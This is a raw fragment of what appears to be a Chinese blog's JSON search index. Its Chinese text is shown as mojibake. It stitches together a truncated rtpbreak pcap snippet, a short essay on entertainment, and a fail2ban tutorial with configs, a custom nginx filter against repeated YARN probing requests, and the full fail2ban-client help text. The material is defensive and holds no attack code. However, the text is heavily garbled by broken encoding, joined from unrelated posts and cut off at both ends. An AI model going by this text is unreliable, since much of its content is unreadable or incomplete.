git:(edge) âœ— rtpbreak -r krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap -g -m -d ./ + rtpbreak v1.3a running here! + pid: 1885, date/time: 01/05/2020#09:49:05 + Configuration + INPUT Packet source: rxfile \u0026#39;krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.","title":"ä»pcapæ–‡ä»¶æå–è½¬wavè¯­éŸ³æ–‡ä»¶"},{"content":"å¨±ä¹è‡³æ­»ï¼Œå¨±ä¹ä¹Ÿèƒ½è®©äººå˜å¾—æ™ºéšœã€‚\nè´ªå›¾äºç²¾ç¥æ„‰æ‚¦ï¼Œåœ¨æ°¸æ— ä¼‘æ­¢çš„æ¬¢æ‚¦ä¸­éš¾ä»¥è‡ªæ‹”ã€‚\né“å¾·ç»ä¸Šå†™é“ï¼šäº”è‰²ä»¤äººç›®ç›²ï¼Œäº”éŸ³ä»¤äººè€³è‹ï¼Œäº”å‘³ä»¤äººå£çˆ½ï¼Œé©°éª‹ç”°çŒä»¤äººå¿ƒå‘ç‹‚ã€‚\nç°ä»£äººå°¤å…¶å¦‚æ­¤ã€‚ä¹°åˆ†è¾¨ç‡æœ€é«˜çš„æ˜¾ç¤ºå™¨ï¼Œåˆ·æ–°é¢‘ç‡æœ€é«˜çš„æ‰‹æœºï¼Œä¹°æœ€è´µçš„è€³æœºï¼Œåƒå£å‘³æœ€ä¸ºåŠ²çˆ†çš„ç«é”…ã€‚\næ„Ÿè§‰äººéƒ½å·²ç»è¢«äº”å®˜æ‰€æ§åˆ¶ï¼Œå˜æˆäº†ä¸€ä¸ªè¡Œå°¸èµ°è‚‰çš„èº¯å£³ã€‚\nä½†æ˜¯è¯åˆè¯´å›æ¥ï¼Œäººä¸ºä»€ä¹ˆè¦è¿™è¦éº»ç—¹è‡ªå·±å‘¢ï¼Ÿ\næˆ–è®¸å˜æˆä¸€ä¸ªæ™ºéšœï¼Œæ‰èƒ½ç¨å¾®ä»ç°å®çš„å¤¹ç¼ä¸­ç¨å¾®ç¼“å£æ°”ã€‚\nå†·é£å¦‚åˆ€ï¼Œä»¥å¤§åœ°ä¸ºç §æ¿ï¼Œè§†ä¼—ç”Ÿçš†ä¸ºé±¼è‚‰ã€‚\n","permalink":"https://wdd.js.org/posts/2020/04/uffptn/","summary":"å¨±ä¹è‡³æ­»ï¼Œå¨±ä¹ä¹Ÿèƒ½è®©äººå˜å¾—æ™ºéšœã€‚\nè´ªå›¾äºç²¾ç¥æ„‰æ‚¦ï¼Œåœ¨æ°¸æ— ä¼‘æ­¢çš„æ¬¢æ‚¦ä¸­éš¾ä»¥è‡ªæ‹”ã€‚\né“å¾·ç»ä¸Šå†™é“ï¼šäº”è‰²ä»¤äººç›®ç›²ï¼Œäº”éŸ³ä»¤äººè€³è‹ï¼Œäº”å‘³ä»¤äººå£çˆ½ï¼Œé©°éª‹ç”°çŒä»¤äººå¿ƒå‘ç‹‚ã€‚\nç°ä»£äººå°¤å…¶å¦‚æ­¤ã€‚ä¹°åˆ†è¾¨ç‡æœ€é«˜çš„æ˜¾ç¤ºå™¨ï¼Œåˆ·æ–°é¢‘ç‡æœ€é«˜çš„æ‰‹æœºï¼Œä¹°æœ€è´µçš„è€³æœºï¼Œåƒå£å‘³æœ€ä¸ºåŠ²çˆ†çš„ç«é”…ã€‚\næ„Ÿè§‰äººéƒ½å·²ç»è¢«äº”å®˜æ‰€æ§åˆ¶ï¼Œå˜æˆäº†ä¸€ä¸ªè¡Œå°¸èµ°è‚‰çš„èº¯å£³ã€‚\nä½†æ˜¯è¯åˆè¯´å›æ¥ï¼Œäººä¸ºä»€ä¹ˆè¦è¿™è¦éº»ç—¹è‡ªå·±å‘¢ï¼Ÿ\næˆ–è®¸å˜æˆä¸€ä¸ªæ™ºéšœï¼Œæ‰èƒ½ç¨å¾®ä»ç°å®çš„å¤¹ç¼ä¸­ç¨å¾®ç¼“å£æ°”ã€‚\nå†·é£å¦‚åˆ€ï¼Œä»¥å¤§åœ°ä¸ºç §æ¿ï¼Œè§†ä¼—ç”Ÿçš†ä¸ºé±¼è‚‰ã€‚","title":"å¨±ä¹æ™ºéšœ"},{"content":"ç®€ä»‹ å¦‚æœä½ çš„ä¸»æœºåœ¨å…¬ç½‘ä¸Šæœ‰ç«¯å£æš´éœ²å‡ºå»ï¼Œé‚£ä¹ˆæ€»ä¼šæœ‰ä¸€äº›ä¸æ€€å¥½æ„çš„å®¶ä¼™ï¼Œä¼šå°è¯•é€šè¿‡å„ç§æ–¹å¼æ”»å‡»ä½ çš„æœºå™¨ã€‚å¸¸è§çš„æœåŠ¡ä¾‹å¦‚ssh, nginxéƒ½ä¼šæœ‰ç±»ä¼¼çš„å¨èƒã€‚\næ‰‹å·¥å°†æŸä¸ªipåŠ å…¥é»‘åå•ï¼Œè¿™ç§æ“ä½œå¤ªéº»çƒ¦ï¼Œè€Œä¸”æ•ˆç‡ä½ã€‚è€Œfail2banå°±æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚\nfail2banå·¥ä½œåŸç† fail2bançš„å·¥ä½œåŸç†æ˜¯ç›‘æ§æŸä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œç„¶åæ ¹æ®æŸäº›å…³é”®è¯ï¼Œæå–å‡ºæ”»å‡»æ–¹çš„IPåœ°å€ï¼Œç„¶åå°†å…¶åŠ å…¥åˆ°é»‘åå•ã€‚\nfail2banå®‰è£… yum install fail2ban -y # å¦‚æœæ‰¾ä¸åˆ°fail2banåŒ…ï¼Œå°±æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ yum install epel-release # å®‰è£…fail2ban å®Œæˆå systemctl enable fail2ban # è®¾ç½®fail2banå¼€æœºå¯åŠ¨ systemctl start fail2ban # å¯åŠ¨fail2ban systemctl status fail2ban # æŸ¥çœ‹fail2bançš„è¿è¡ŒçŠ¶æ€ ç”¨fail2banä¿æŠ¤ssh fail2bançš„é…ç½®æ–‡ä»¶ä½äº/etc/fail2banç›®å½•ä¸‹ã€‚\nåœ¨è¯¥ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ jail.local, å†…å®¹å¦‚ä¸‹\nbantime æŒç»­ç¦æ­¢å¤šä¹… maxretry æœ€å¤§å¤šå°‘æ¬¡å°è¯• banaction æ‹¦æˆªåçš„æ“ä½œ findtime æŸ¥æ‰¾æ—¶é—´ çœ‹ä¸‹ä¸‹é¢çš„æ“ä½œçš„æ„æ€æ˜¯ï¼šç›‘æ§sshdæœåŠ¡çš„æœ€è¿‘10åˆ†é’Ÿçš„æ—¥å¿—ï¼Œå¦‚æœæŸä¸ªipåœ¨10åˆ†é’Ÿä¹‹å†…ï¼Œæœ‰2æ¬¡ç™»å½•å¤±è´¥ï¼Œå°±æŠŠè¿™ä¸ªipåŠ å…¥é»‘åå•, 24å°æ—¶ä¹‹åï¼Œè¿™ä¸ªipæ‰ä¼šè¢«ä»é»‘åå•ä¸­ç§»é™¤ã€‚\n[DEFAULT] bantime = 24h banaction = iptables-multiport maxretry = 2 findtime = 10m [sshd] enabled = true ç„¶åé‡å¯fail2ban, systemctl restart fail2banÂ fail2banæä¾›ç®¡ç†å·¥å…·fail2ban-client\n**fail2ban-client status **æ˜¾ç¤ºfail2bançš„çŠ¶æ€ **fail2ban-client status sshd **æ˜¾ç¤ºæŸä¸ªç›‘ç‹±çš„é…ç½®ã€‚ä»ä¸‹æ–‡çš„è¾“å‡ºæ¥çœ‹å¯ä»¥çœ‹å‡ºæ¥fail2banå·²ç»æ‹¦æˆªäº†ä¸€äº›IPåœ°å€äº† \u0026gt; fail2ban-client status Status |- Number of jail:\t1 `- Jail list:\tsshd \u0026gt; fail2ban-client status sshd Status for the jail: sshd |- Filter | |- Currently failed:\t2 | |- Total failed:\t23289 | `- Journal matches:\t_SYSTEMD_UNIT=sshd.service + _COMM=sshd `- Actions |- Currently banned:\t9 |- Total banned:\t1270 `- Banned IP list:\t93.174.93.10 165.22.238.92 23.231.25.234 134.255.219.207 77.202.192.113 120.224.47.86 144.91.70.139 90.3.194.84 217.182.89.87 fail2banä¿æŠ¤sshdçš„åŸç† fail2bançš„é…ç½®æ–‡ä»¶ç›®å½•ä¸‹æœ‰ä¸ªfilter.dç›®å½•ï¼Œè¯¥ç›®å½•ä¸‹æœ‰ä¸ªsshd.confçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯å¯¹äºsshdæ—¥å¿—çš„è¿‡æ»¤è§„åˆ™ï¼Œé‡Œé¢æœ‰äº›æ­£å¸¸æ—¶ç”¨æ¥æå–å‡ºæ¶æ„å®¶ä¼™çš„IPåœ°å€ã€‚\né…ç½®é…ç½®æ–‡ä»¶å¾ˆé•¿ï¼Œæˆ‘ä»¬åªçœ‹å…¶ä¸­ä¸€æ®µï¼Œ å…¶ä¸­**\u0026lt;****HOST\u0026gt;**æ˜¯ä¸ªéå¸¸é‡è¦çš„å…³é”®è¯ï¼Œæ˜¯ç”¨æ¥æå–å‡ºè¿œç¨‹çš„IPåœ°å€çš„ã€‚\ncmnfailre = ^[aA]uthentication (?:failure|error|failed) for \u0026lt;F-USER\u0026gt;.*\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;( via \\S+)?%(__suff)s$ ^User not known to the underlying authentication module for \u0026lt;F-USER\u0026gt;.*\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;%(__suff)s$ ^Failed publickey for invalid user \u0026lt;F-USER\u0026gt;(?P\u0026lt;cond_user\u0026gt;\\S+)|(?:(?! from ).)*?\u0026lt;/F-USER\u0026gt; from \u0026lt;HOST\u0026gt;%(__on_port_opt)s(?: ssh\\d*)?(?(cond_us å®æˆ˜ï¼šå¦‚ä½•è‡ªå®šä¹‰ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ æˆ‘çš„nginxæœåŠ¡å™¨ï¼Œå‡ ä¹æ¯éš”2-3ç§’å°±ä¼šæ”¶åˆ°ä¸‹é¢çš„ä¸€ä¸ªè¯·æ±‚ã€‚\nä¸‹é¢æˆ‘å°±å†™ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œå°†ç±»ä¼¼è¯·æ±‚çš„IPåŠ å…¥é»‘åå•ã€‚\n165.22.225.238 - - [28/Apr/2020:08:19:38 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; 165.22.225.238 - - [28/Apr/2020:08:22:48 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; 165.22.225.238 - - [28/Apr/2020:08:24:08 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; 165.22.225.238 - - [28/Apr/2020:08:25:45 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; 165.22.225.238 - - [28/Apr/2020:08:28:01 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; step1: åˆ†ææ—¥å¿—è§„åˆ™ 165.22.225.238 - - [28/Apr/2020:08:19:38 +0800] \u0026#34;POST /ws/v1/cluster/apps/new-application HTTP/1.1\u0026#34; 502 11 \u0026#34;-\u0026#34; \u0026#34;python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64\u0026#34; \u0026#34;-\u0026#34; HOST - - .*\u0026#34; 502 .* step2: å†™è§„åˆ™æ–‡ä»¶ åœ¨filter.dç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶ banit.conf\n[INCLUDES] [Definition] failregex = \u0026lt;HOST\u0026gt; - - .*\u0026#34; 502 .* ignoreregex = step3: ä¿®æ”¹jail.local [DEFAULT] bantime = 24h banaction = iptables-multiport maxretry = 2 findtime = 10m [sshd] enabled = true [banit] enabled = true action = iptables-allports[name=banit, protocol=all] logpath = /var/log/nginx/access.log step4: é‡å¯fail2ban fail2ban-client restart**\nstep5: æŸ¥çœ‹æ•ˆæœ å¯ä»¥çœ‹å‡ºbanitçš„è¿™ä¸ªç›‘ç‹±ï¼Œå·²ç»åŠ å…¥äº†ä¸€ä¸ª165.22.225.238è¿™ä¸ªipï¼Œè¿™ä¸ªæµæ°“ä¸ä¼šåœ¨éªšæ‰°æˆ‘ä»¬çš„ä¸»æœºäº†ã€‚\n\u0026gt; fail2ban fail2ban-client status banit Status for the jail: banit |- Filter | |- Currently failed:\t1 | |- Total failed:\t5 | `- File list:\t/var/log/nginx/access.log `- Actions |- Currently banned:\t1 |- Total banned:\t1 `- Banned IP list:\t165.22.225.238 **\nfail2ban-client å¸¸ç”¨æ“ä½œ é‡å¯: **fail2ban systemctl restart fail2ban ** æŸ¥çœ‹fail2ban opensipsè¿è¡ŒçŠ¶æ€: **fail2ban-client status opensips ** é»‘åå•æ“ä½œ (æ³¨æ„ï¼Œé»‘åå•æµ‹è¯•æ—¶ï¼Œä¸è¦æŠŠè‡ªå·±çš„IPåŠ åˆ°é»‘åå•é‡Œåšæµ‹è¯•ï¼Œå¦åˆ™å°±è¿ä¸ä¸Šæœºå™¨äº†) IPåŠ å…¥é»‘åå•ï¼š**fail2ban-client set opensips banip 192.168.1.8 ** IPè§£é”ï¼šfail2ban-client set opensips unbanip 192.168.1.8 ç™½åå•æ“ä½œ IPåŠ å…¥ç™½åå•ï¼šfail2ban-client set opensips addignoreip 192.168.1.8 IPä»ç™½åå•ä¸­ç§»é™¤ï¼šfail2ban-client set opensips delignoreip 192.168.1.8 åœ¨æ‰€æœ‰ç›‘ç‹±ä¸­åŠ å…¥IPç™½åå•ï¼šfail2ban-clien unbanÂ 192.168.1.8 fail2bançš„æ‹¦æˆªæ˜¯åŸºäºjail, å¦‚æœä¸€ä¸ªipåœ¨æŸä¸ªjailä¸­ï¼Œä½†æ˜¯ä¸åœ¨å…¶ä»–jailä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªipä¹Ÿæ˜¯æ— æ³•è®¿é—®ä¸»æœºã€‚å¦‚æœæƒ³åœ¨æ‰€æœ‰jailä¸­åŠ å…¥ä¸€ä¸ªç™½åå•ï¼Œéœ€è¦fail2ban-client unban ipã€‚\n**\nfail2ban-clientå¸®åŠ©æ–‡æ¡£ Usage: fail2ban-client [OPTIONS] \u0026lt;COMMAND\u0026gt; Fail2Ban v0.10.5 reads log file that contains password failure report and bans the corresponding IP addresses using firewall rules. Options: -c \u0026lt;DIR\u0026gt; configuration directory -s \u0026lt;FILE\u0026gt; socket path -p \u0026lt;FILE\u0026gt; pidfile path --loglevel \u0026lt;LEVEL\u0026gt; logging level --logtarget \u0026lt;TARGET\u0026gt; logging target, use file-name or stdout, stderr, syslog or sysout. --syslogsocket auto|\u0026lt;FILE\u0026gt; -d dump configuration. For debugging --dp, --dump-pretty dump the configuration using more human readable representation -t, --test test configuration (can be also specified with start parameters) -i interactive mode -v increase verbosity -q decrease verbosity -x force execution of the server (remove socket file) -b start server in background (default) -f start server in foreground --async start server in async mode (for internal usage only, don\u0026#39;t read configuration) --timeout timeout to wait for the server (for internal usage only, don\u0026#39;t read configuration) --str2sec \u0026lt;STRING\u0026gt; convert time abbreviation format to seconds -h, --help display this help message -V, --version print the version (-V returns machine-readable short format) Command: BASIC start starts the server and the jails restart restarts the server restart [--unban] [--if-exists] \u0026lt;JAIL\u0026gt; restarts the jail \u0026lt;JAIL\u0026gt; (alias for \u0026#39;reload --restart ... \u0026lt;JAIL\u0026gt;\u0026#39;) reload [--restart] [--unban] [--all] reloads the configuration without restarting of the server, the option \u0026#39;--restart\u0026#39; activates completely restarting of affected jails, thereby can unban IP addresses (if option \u0026#39;--unban\u0026#39; specified) reload [--restart] [--unban] [--if-exists] \u0026lt;JAIL\u0026gt; reloads the jail \u0026lt;JAIL\u0026gt;, or restarts it (if option \u0026#39;--restart\u0026#39; specified) stop stops all jails and terminate the server unban --all unbans all IP addresses (in all jails and database) unban \u0026lt;IP\u0026gt; ... \u0026lt;IP\u0026gt; unbans \u0026lt;IP\u0026gt; (in all jails and database) status gets the current status of the server ping tests if the server is alive echo for internal usage, returns back and outputs a given string help return this output version return the server version LOGGING set loglevel \u0026lt;LEVEL\u0026gt; sets logging level to \u0026lt;LEVEL\u0026gt;. Levels: CRITICAL, ERROR, WARNING, NOTICE, INFO, DEBUG, TRACEDEBUG, HEAVYDEBUG or corresponding numeric value (50-5) get loglevel gets the logging level set logtarget \u0026lt;TARGET\u0026gt; sets logging target to \u0026lt;TARGET\u0026gt;. Can be STDOUT, STDERR, SYSLOG or a file get logtarget gets logging target set syslogsocket auto|\u0026lt;SOCKET\u0026gt; sets the syslog socket path to auto or \u0026lt;SOCKET\u0026gt;. Only used if logtarget is SYSLOG get syslogsocket gets syslog socket path flushlogs flushes the logtarget if a file and reopens it. For log rotation. DATABASE set dbfile \u0026lt;FILE\u0026gt; set the location of fail2ban persistent datastore. Set to \u0026#34;None\u0026#34; to disable get dbfile get the location of fail2ban persistent datastore set dbmaxmatches \u0026lt;INT\u0026gt; sets the max number of matches stored in database per ticket get dbmaxmatches gets the max number of matches stored in database per ticket set dbpurgeage \u0026lt;SECONDS\u0026gt; sets the max age in \u0026lt;SECONDS\u0026gt; that history of bans will be kept get dbpurgeage gets the max age in seconds that history of bans will be kept JAIL CONTROL add \u0026lt;JAIL\u0026gt; \u0026lt;BACKEND\u0026gt; creates \u0026lt;JAIL\u0026gt; using \u0026lt;BACKEND\u0026gt; start \u0026lt;JAIL\u0026gt; starts the jail \u0026lt;JAIL\u0026gt; stop \u0026lt;JAIL\u0026gt; stops the jail \u0026lt;JAIL\u0026gt;. The jail is removed status \u0026lt;JAIL\u0026gt; [FLAVOR] gets the current status of \u0026lt;JAIL\u0026gt;, with optional flavor or extended info JAIL CONFIGURATION set \u0026lt;JAIL\u0026gt; idle on|off sets the idle state of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; ignoreself true|false allows the ignoring of own IP addresses set \u0026lt;JAIL\u0026gt; addignoreip \u0026lt;IP\u0026gt; adds \u0026lt;IP\u0026gt; to the ignore list of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; delignoreip \u0026lt;IP\u0026gt; removes \u0026lt;IP\u0026gt; from the ignore list of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; ignorecommand \u0026lt;VALUE\u0026gt; sets ignorecommand of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; ignorecache \u0026lt;VALUE\u0026gt; sets ignorecache of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; addlogpath \u0026lt;FILE\u0026gt; [\u0026#39;tail\u0026#39;] adds \u0026lt;FILE\u0026gt; to the monitoring list of \u0026lt;JAIL\u0026gt;, optionally starting at the \u0026#39;tail\u0026#39; of the file (default \u0026#39;head\u0026#39;). set \u0026lt;JAIL\u0026gt; dellogpath \u0026lt;FILE\u0026gt; removes \u0026lt;FILE\u0026gt; from the monitoring list of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; logencoding \u0026lt;ENCODING\u0026gt; sets the \u0026lt;ENCODING\u0026gt; of the log files for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; addjournalmatch \u0026lt;MATCH\u0026gt; adds \u0026lt;MATCH\u0026gt; to the journal filter of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; deljournalmatch \u0026lt;MATCH\u0026gt; removes \u0026lt;MATCH\u0026gt; from the journal filter of \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; addfailregex \u0026lt;REGEX\u0026gt; adds the regular expression \u0026lt;REGEX\u0026gt; which must match failures for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; delfailregex \u0026lt;INDEX\u0026gt; removes the regular expression at \u0026lt;INDEX\u0026gt; for failregex set \u0026lt;JAIL\u0026gt; addignoreregex \u0026lt;REGEX\u0026gt; adds the regular expression \u0026lt;REGEX\u0026gt; which should match pattern to exclude for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; delignoreregex \u0026lt;INDEX\u0026gt; removes the regular expression at \u0026lt;INDEX\u0026gt; for ignoreregex set \u0026lt;JAIL\u0026gt; findtime \u0026lt;TIME\u0026gt; sets the number of seconds \u0026lt;TIME\u0026gt; for which the filter will look back for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; bantime \u0026lt;TIME\u0026gt; sets the number of seconds \u0026lt;TIME\u0026gt; a host will be banned for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; datepattern \u0026lt;PATTERN\u0026gt; sets the \u0026lt;PATTERN\u0026gt; used to match date/times for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; usedns \u0026lt;VALUE\u0026gt; sets the usedns mode for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; attempt \u0026lt;IP\u0026gt; [\u0026lt;failure1\u0026gt; ... \u0026lt;failureN\u0026gt;] manually notify about \u0026lt;IP\u0026gt; failure set \u0026lt;JAIL\u0026gt; banip \u0026lt;IP\u0026gt; ... \u0026lt;IP\u0026gt; manually Ban \u0026lt;IP\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; unbanip [--report-absent] \u0026lt;IP\u0026gt; ... \u0026lt;IP\u0026gt; manually Unban \u0026lt;IP\u0026gt; in \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; maxretry \u0026lt;RETRY\u0026gt; sets the number of failures \u0026lt;RETRY\u0026gt; before banning the host for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; maxmatches \u0026lt;INT\u0026gt; sets the max number of matches stored in memory per ticket in \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; maxlines \u0026lt;LINES\u0026gt; sets the number of \u0026lt;LINES\u0026gt; to buffer for regex search for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; addaction \u0026lt;ACT\u0026gt;[ \u0026lt;PYTHONFILE\u0026gt; \u0026lt;JSONKWARGS\u0026gt;] adds a new action named \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt;. Optionally for a Python based action, a \u0026lt;PYTHONFILE\u0026gt; and \u0026lt;JSONKWARGS\u0026gt; can be specified, else will be a Command Action set \u0026lt;JAIL\u0026gt; delaction \u0026lt;ACT\u0026gt; removes the action \u0026lt;ACT\u0026gt; from \u0026lt;JAIL\u0026gt; COMMAND ACTION CONFIGURATION set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionstart \u0026lt;CMD\u0026gt; sets the start command \u0026lt;CMD\u0026gt; of the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionstop \u0026lt;CMD\u0026gt; sets the stop command \u0026lt;CMD\u0026gt; of the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actioncheck \u0026lt;CMD\u0026gt; sets the check command \u0026lt;CMD\u0026gt; of the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionban \u0026lt;CMD\u0026gt; sets the ban command \u0026lt;CMD\u0026gt; of the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionunban \u0026lt;CMD\u0026gt; sets the unban command \u0026lt;CMD\u0026gt; of the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; timeout \u0026lt;TIMEOUT\u0026gt; sets \u0026lt;TIMEOUT\u0026gt; as the command timeout in seconds for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; GENERAL ACTION CONFIGURATION set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; \u0026lt;PROPERTY\u0026gt; \u0026lt;VALUE\u0026gt; sets the \u0026lt;VALUE\u0026gt; of \u0026lt;PROPERTY\u0026gt; for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; set \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; \u0026lt;METHOD\u0026gt;[ \u0026lt;JSONKWARGS\u0026gt;] calls the \u0026lt;METHOD\u0026gt; with \u0026lt;JSONKWARGS\u0026gt; for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; JAIL INFORMATION get \u0026lt;JAIL\u0026gt; logpath gets the list of the monitored files for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; logencoding gets the encoding of the log files for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; journalmatch gets the journal filter match for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; ignoreself gets the current value of the ignoring the own IP addresses get \u0026lt;JAIL\u0026gt; ignoreip gets the list of ignored IP addresses for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; ignorecommand gets ignorecommand of \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; failregex gets the list of regular expressions which matches the failures for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; ignoreregex gets the list of regular expressions which matches patterns to ignore for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; findtime gets the time for which the filter will look back for failures for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; bantime gets the time a host is banned for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; datepattern gets the patern used to match date/times for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; usedns gets the usedns setting for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; maxretry gets the number of failures allowed for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; maxmatches gets the max number of matches stored in memory per ticket in \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; maxlines gets the number of lines to buffer for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; actions gets a list of actions for \u0026lt;JAIL\u0026gt; COMMAND ACTION INFORMATION get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionstart gets the start command for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionstop gets the stop command for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actioncheck gets the check command for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionban gets the ban command for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; actionunban gets the unban command for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; timeout gets the command timeout in seconds for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; GENERAL ACTION INFORMATION get \u0026lt;JAIL\u0026gt; actionproperties \u0026lt;ACT\u0026gt; gets a list of properties for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; actionmethods \u0026lt;ACT\u0026gt; gets a list of methods for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; get \u0026lt;JAIL\u0026gt; action \u0026lt;ACT\u0026gt; \u0026lt;PROPERTY\u0026gt; gets the value of \u0026lt;PROPERTY\u0026gt; for the action \u0026lt;ACT\u0026gt; for \u0026lt;JAIL\u0026gt; Report bugs to https://github.com/fail2ban/fail2ban/issues Report bugs to https://github.com/fail2ban/fail2ban/issues\n","permalink":"https://wdd.js.org/posts/2020/04/ih9pz2/","summary":"ç®€ä»‹ å¦‚æœä½ çš„ä¸»æœºåœ¨å…¬ç½‘ä¸Šæœ‰ç«¯å£æš´éœ²å‡ºå»ï¼Œé‚£ä¹ˆæ€»ä¼šæœ‰ä¸€äº›ä¸æ€€å¥½æ„çš„å®¶ä¼™ï¼Œä¼šå°è¯•é€šè¿‡å„ç§æ–¹å¼æ”»å‡»ä½ çš„æœºå™¨ã€‚å¸¸è§çš„æœåŠ¡ä¾‹å¦‚ssh, 